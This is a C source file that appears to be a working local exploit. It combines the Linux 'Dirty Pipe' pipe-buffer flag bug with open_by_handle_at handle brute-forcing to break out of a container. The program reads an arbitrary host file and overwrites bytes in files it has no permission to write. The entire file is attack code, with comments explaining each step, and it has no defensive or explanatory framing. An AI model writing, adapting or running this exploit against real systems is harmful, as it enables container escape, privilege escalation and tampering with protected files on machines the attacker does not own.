#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <sys/types.h>
#include <errno.h>
#include <dirent.h>
#include <stdint.h>
#include <stdbool.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

/**
 * Create a pipe where all "bufs" on the pipe_inode_info ring have the
 * PIPE_BUF_FLAG_CAN_MERGE flag set.
 */
static void prepare_pipe(int p[2])
{
    if (pipe(p))
        abort();

    const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    static char buffer[4096];

    /* fill the pipe completely; each pipe_buffer will now have
    the PIPE_BUF_FLAG_CAN_MERGE flag */
    for (unsigned r = pipe_size; r > 0;)
    {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        write(p[1], buffer, n);
        r -= n;
    }

    /* drain the pipe, freeing all pipe_buffer instances (but
    leaving the flags initialized) */
    for (unsigned r = pipe_size; r > 0;)
    {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        read(p[0], buffer, n);
        r -= n;
    }

    /* the pipe is now empty, and if somebody adds a new
    pipe_buffer without initializing its "flags", the buffer
    will be mergeable */
}

struct my_file_handle
{
    unsigned int handle_bytes;
    int handle_type;
    unsigned char f_handle[8];
};

void die(const char *msg)
{
    perror(msg);
    exit(errno);
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
    int fd;
    uint32_t ino = 0;
    struct my_file_handle outh = {
        .handle_bytes = 8,
        .handle_type = 1};
    DIR *dir = NULL;
    struct dirent *de = NULL;

    path = strchr(path, '/');

    // recursion stops if path has been resolved
    if (!path)
    {
        memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
        oh->handle_type = 1;
        oh->handle_bytes = 8;
        return 1;
    }
    ++path;

    if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
        die("[-] open_by_handle_at");

    if ((dir = fdopendir(fd)) == NULL)
        die("[-] fdopendir");

    for (;;)
    {
        de = readdir(dir);
        if (!de)
            break;
        if (strncmp(de->d_name, path, strlen(de->d_name)) == 0)
        {
            ino = de->d_ino;
            break;
        }
    }

    if (de)
    {
        for (uint32_t i = 0; i < 0xffffffff; ++i)
        {
            outh.handle_bytes = 8;
            outh.handle_type = 1;
            memcpy(outh.f_handle, &ino, sizeof(ino));
            memcpy(outh.f_handle + 4, &i, sizeof(i));

            if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0)
            {
                closedir(dir);
                close(fd);
                return find_handle(bfd, path, &outh, oh);
            }
        }
    }

    closedir(dir);
    close(fd);
    return 0;
}

int main(int argc, char **argv)
{
    if (argc != 4 && argc != 2)
    {
        fprintf(stderr, "Usage: %s TARGETFILE [OFFSET DATA]\n", argv[0]);
        return EXIT_FAILURE;
    }
    /* dumb command-line argument parser */
    const char *const path = argv[1];
    loff_t offset;
    const char *data;
    bool overwrite = false;
    if (argc == 4)
    {
        overwrite = true;
        offset = strtoul(argv[2], NULL, 0);
        data = argv[3];
    }

    char buf[0x1000];
    int fd1, fd2;
    struct my_file_handle h;
    struct my_file_handle root_h = {
        .handle_bytes = 8,
        .handle_type = 1,
        .f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}};

    // get a FS reference from something mounted in from outside
    if ((fd1 = open("/etc/hosts", O_RDONLY)) < 0)
        die("[-] open");

    if (find_handle(fd1, path, &root_h, &h) <= 0)
        die("[-] Cannot find valid handle!");

    if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
        die("[-] open_by_handle");

    memset(buf, 0, sizeof(buf));
    if (read(fd2, buf, sizeof(buf) - 1) < 0)
        die("[-] read");

    fprintf(stderr, "Dumping %s successfully, content:\n\n%s\n", path, buf);

    if (!overwrite)
    {
        return EXIT_SUCCESS;
    }

    const size_t data_size = strlen(data);

    if (offset % PAGE_SIZE == 0)
    {
        fprintf(stderr, "Sorry, cannot start writing at a page boundary\n");
        return EXIT_FAILURE;
    }

    const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
    const loff_t end_offset = offset + (loff_t)data_size;
    if (end_offset > next_page)
    {
        fprintf(stderr, "Sorry, cannot write across a page boundary\n");
        return EXIT_FAILURE;
    }

    struct stat st;
    if (fstat(fd2, &st))
    {
        perror("stat failed");
        return EXIT_FAILURE;
    }

    if (offset > st.st_size)
    {
        fprintf(stderr, "Offset is not inside the file\n");
        return EXIT_FAILURE;
    }

    if (end_offset > st.st_size)
    {
        fprintf(stderr, "Sorry, cannot enlarge the file\n");
        return EXIT_FAILURE;
    }

    /* create the pipe with all flags initialized with
    PIPE_BUF_FLAG_CAN_MERGE */
    int p[2];
    prepare_pipe(p);

    /* splice one byte from before the specified offset into the
    pipe; this will add a reference to the page cache, but
    since copy_page_to_iter_pipe() does not initialize the
    "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
    --offset;
    ssize_t nbytes = splice(fd2, &offset, p[1], NULL, 1, 0);
    if (nbytes < 0)
    {
        perror("splice failed");
        return EXIT_FAILURE;
    }
    if (nbytes == 0)
    {
        fprintf(stderr, "short splice\n");
        return EXIT_FAILURE;
    }

    /* the following write will not create a new pipe_buffer, but
    will instead write into the page cache, because of the
    PIPE_BUF_FLAG_CAN_MERGE flag */
    nbytes = write(p[1], data, data_size);
    if (nbytes < 0)
    {
        perror("write failed");
        return EXIT_FAILURE;
    }
    if ((size_t)nbytes < data_size)
    {
        fprintf(stderr, "short write\n");
        return EXIT_FAILURE;
    }

    printf("Overwrite %s successfully.\n", path);
    return EXIT_SUCCESS;
}